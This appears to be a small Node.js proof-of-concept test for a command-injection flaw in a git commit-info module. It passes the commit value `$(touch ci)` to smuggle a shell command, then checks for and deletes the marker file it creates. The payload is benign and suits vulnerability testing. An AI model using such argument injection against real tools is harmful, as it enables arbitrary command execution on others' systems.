
const gitCommitInfo = require('./INPROGRESS_vulnerable_slice');
const fs = require('fs');

(async () => {
  const info = await gitCommitInfo({
    cwd: '.',
    commit: `$(touch ci)`
  });

  console.log(info?.error?.stderr || info);

  if (fs.existsSync('./ci')) {
    console.log('✅ Exploit succeeded: ci file created!');
    fs.unlinkSync('./ci');
  } else {
    console.log('❌ Exploit failed: ci file not found.');
  }
})();

